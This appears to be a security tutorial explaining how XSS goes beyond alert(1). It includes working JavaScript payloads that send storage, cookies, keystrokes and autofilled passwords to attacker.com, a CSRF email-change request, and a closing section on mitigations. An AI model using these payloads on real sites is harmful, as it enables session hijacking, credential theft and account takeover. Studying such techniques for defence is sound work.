# Going Beyond alert(1)

## Going Beyond `alert(1)`: Offensive JavaScript Techniques

### High-Level Summary

Exploiting **Cross-Site Scripting (XSS)** extends far beyond simple JavaScript pop-ups like `alert(1)`. Attackers use **offensive JavaScript techniques** to gain control over a victim’s browser, steal sensitive data, manipulate the DOM, and hijack user sessions. These attacks are often combined with **social engineering, phishing, or automated scripts** to cause **real-world damage**.

To fully understand **offensive JavaScript**, it is crucial to explore methods that **exfiltrate data**, **interact with browser storage**, **perform unauthorized actions**, and **exploit user trust**. These methods illustrate the risks of XSS and the necessity of strong security measures.

***

### Definition Bank

| Term                                  | Definition                                                                                                                               |
| ------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| **localStorage**                      | A browser storage mechanism that retains data even after the browser is closed, making it persistent across sessions.                    |
| **sessionStorage**                    | Similar to `localStorage`, but the data is cleared when the session (browser tab) is closed.                                             |
| **document.cookie**                   | A property that stores **HTTP cookies** associated with the current page. If improperly secured, cookies can be accessed via JavaScript. |
| **XMLHttpRequest (XHR)**              | A **legacy** JavaScript API used for making HTTP requests, often exploited in XSS attacks.                                               |
| **Fetch API**                         | A **modern** JavaScript API that allows cleaner, more efficient HTTP requests, commonly used for data exfiltration.                      |
| **Keylogging**                        | Capturing user keystrokes to steal sensitive information such as passwords and credit card numbers.                                      |
| **CSRF (Cross-Site Request Forgery)** | An attack that tricks users into performing unintended actions on a site where they are authenticated.                                   |

***

### Offensive JavaScript Techniques

#### 1. Accessing Local and Session Storage

Web applications often store **user preferences, session tokens, or API keys** in `localStorage` or `sessionStorage`. Attackers can exploit **XSS vulnerabilities** to retrieve this data.

**Payload: Extracting Storage Data**

```javascript
let localStorageData = JSON.stringify(localStorage);
let sessionStorageData = JSON.stringify(sessionStorage);
fetch("http://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify({ localStorage: localStorageData, sessionStorage: sessionStorageData })
});
```

**Why This Works:**

* **`localStorage` data persists** across browser sessions, making it a valuable target.
* **`sessionStorage` data disappears** when the tab closes, but is still vulnerable during an active session.

***

#### 2. Stealing Cookies

Cookies often contain **session identifiers** that allow an attacker to hijack a user’s session.

**Payload: Sending Cookies to an External Server**

```javascript
fetch("http://attacker.com/steal", {
    method: "POST",
    body: document.cookie
});
```

**Why This Works:**

* If **cookies lack the `HttpOnly` flag**, JavaScript can read them.
* Attackers can **steal session IDs**, allowing them to impersonate victims.

***

#### 3. Exfiltrating Data via HTTP Requests

Attackers often use **background HTTP requests** to **exfiltrate stolen data**.

**Legacy Approach: Using XMLHttpRequest**

```javascript
let xhr = new XMLHttpRequest();
xhr.open("POST", "http://attacker.com/steal", true);
xhr.send("data=stolen");
```

**Modern Approach: Using Fetch API**

```javascript
fetch("http://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify({ data: "stolen" })
});
```

**Why This Works:**

* **Fetch API** is **simpler** and **stealthier** than `XMLHttpRequest`.
* Can be used to **exfiltrate stolen credentials, API keys, or session tokens**.

***

#### 4. Keylogging: Capturing User Keystrokes

Attackers can use **event listeners** to log every keystroke a user makes.

**Payload: Keylogging via `document.onkeypress`**

```javascript
document.onkeypress = function(e) {
    fetch("http://attacker.com/steal", {
        method: "POST",
        body: JSON.stringify({ key: e.key })
    });
};
```

**Why This Works:**

* Can capture **usernames, passwords, credit card numbers** typed into web forms.
* Often used in **phishing attacks** or **malicious browser extensions**.

***

#### 5. Cross-Site Request Forgery (CSRF)

Attackers can **force logged-in users** to perform unauthorized actions.

**Payload: Forcing a Victim to Change Email Address**

```javascript
let xhr = new XMLHttpRequest();
xhr.open("POST", "https://victim.com/change-email", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=attacker@evil.com");
```

**Why This Works:**

* If the victim is **already logged in**, the request is executed **with their session credentials**.
* Common targets include **bank transfers, password resets, and account modifications**.

***

#### 6. Capturing Auto-Filled Credentials

Attackers can **inject fake login fields** and capture **auto-filled** credentials.

**Payload: Creating Fake Login Fields**

```javascript
let fakeInput = document.createElement("input");
fakeInput.type = "text";
fakeInput.name = "username";
document.body.appendChild(fakeInput);

let fakePass = document.createElement("input");
fakePass.type = "password";
fakePass.name = "password";
document.body.appendChild(fakePass);

setTimeout(() => {
    fetch("http://attacker.com/steal", {
        method: "POST",
        body: JSON.stringify({
            username: document.getElementsByName("username")[0].value,
            password: document.getElementsByName("password")[0].value
        })
    });
}, 5000);
```

**Why This Works:**

* The browser **auto-fills login fields**, and JavaScript can **extract the values**.
* Used in **phishing attacks** where the page looks **legitimate** but is actually **malicious**.

***

### Comparison of Secure vs. Insecure Approaches

| Approach                            | Secure? | Explanation                                                             |
| ----------------------------------- | ------- | ----------------------------------------------------------------------- |
| **localStorage for sensitive data** | ❌       | Can be accessed by **any JavaScript**, making it **vulnerable to XSS**. |
| **HttpOnly Cookies**                | ✅       | Prevents JavaScript from reading sensitive cookies.                     |
| **Content Security Policy (CSP)**   | ✅       | Restricts which scripts can execute, reducing XSS impact.               |
| **CSRF Tokens**                     | ✅       | Ensures that requests are **intentionally** made by users.              |

***

### Mitigation: Defense Against Offensive JavaScript

#### **1. Use HttpOnly and Secure Cookies**

```javascript
Set-Cookie: sessionid=xyz; HttpOnly; Secure
```

Prevents **JavaScript from accessing cookies**, blocking **session hijacking**.

***

#### **2. Implement a Strict Content Security Policy (CSP)**

```javascript
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

Prevents execution of **untrusted JavaScript** and **external scripts**.

***

#### **3. Sanitize and Escape User Input**

```javascript
function escapeHTML(unsafe) {
    return unsafe.replace(/&/g, "&amp;")
                 .replace(/</g, "&lt;")
                 .replace(/>/g, "&gt;")
                 .replace(/"/g, "&quot;")
                 .replace(/'/g, "&#039;");
}
```

**Encodes special characters**, preventing **script execution**.

***

#### **4. Validate and Restrict Storage Usage**

```javascript
if (localStorage.getItem("token")) {
    alert("Warning: Storing sensitive data in localStorage is insecure.");
}
```

Avoid storing **sensitive data** in localStorage.

***

#### **5. Implement CSRF Tokens**

```html
<input type="hidden" name="csrf_token" value="randomToken123">
```

**Prevents unauthorized requests** by requiring **unique, per-request tokens**.

***

### Conclusion

XSS attacks **go far beyond simple alerts** and enable attackers to **steal data, manipulate user actions, and hijack sessions**. Understanding **offensive JavaScript techniques** highlights the importance of **proper security controls** such as **CSP, HttpOnly cookies, CSRF protection, and secure storage practices**.
